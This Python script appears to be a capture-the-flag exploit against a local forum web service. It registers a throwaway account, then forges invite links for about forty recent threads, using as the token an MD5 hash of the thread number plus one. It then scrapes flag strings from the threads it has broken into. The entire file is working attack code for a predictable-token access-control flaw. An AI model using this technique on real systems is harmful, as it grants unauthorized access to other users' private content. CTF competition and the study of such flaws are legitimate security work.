#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'wolf']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '5000'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ):
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ""

	u_name = id_gen(next=alph_caps)
	passwd = id_gen(first=alph_full)
		
	register( u_name, passwd )
	sess = login( u_name, passwd )

	threads = threads_id(sess)
	last_id = int( threads[len(threads)-1] )

	for t_id in range(last_id - 40, last_id):

		invite_thread( sess, t_id )

		for flag in view_thread( sess, t_id ):
			flags += flag + "\n"

	print( flags, flush=True )


def register( u_name, passwd ):
	#http://127.0.0.1:5000/register | POST | login=name&password=pass
	requests.post(f'http://{host}/register', data = {'login':u_name, 'password':passwd})


def login( u_name, passwd ):
	#http://127.0.0.1:5000/login | POST | login=name&password=pass
	s = requests.session()
	s.post(f'http://{host}/login', data = {'login':u_name, 'password':passwd})
	return s


def threads_id( s ):
	#http://127.0.0.1:5000/create | POST | name=Name
	data = s.post(f'http://{host}/create', data={"name":"SuperUsers'sNews"}).text
	return  re.findall( "/threads/(\d+)", data )


def invite_thread( s, t_id ):
	#http://127.0.0.1:5000/find/2/57/093f65e080a295f8076b1c5722a46aa2 | GET
	hash = hashlib.md5(str(t_id + 1).encode()).hexdigest()
	s.get( f'http://{host}/find/{t_id}/1/{hash}')#, data={"text":flag} )


def view_thread( s, t_id ) -> list:
	#http://127.0.0.1:5000/threads/5 | GET
	data = s.get( f'http://{host}/threads/{t_id}').text#, data={"text":flag} )
	return  FlagRegExp.findall( data )


if __name__ == '__main__':
	main()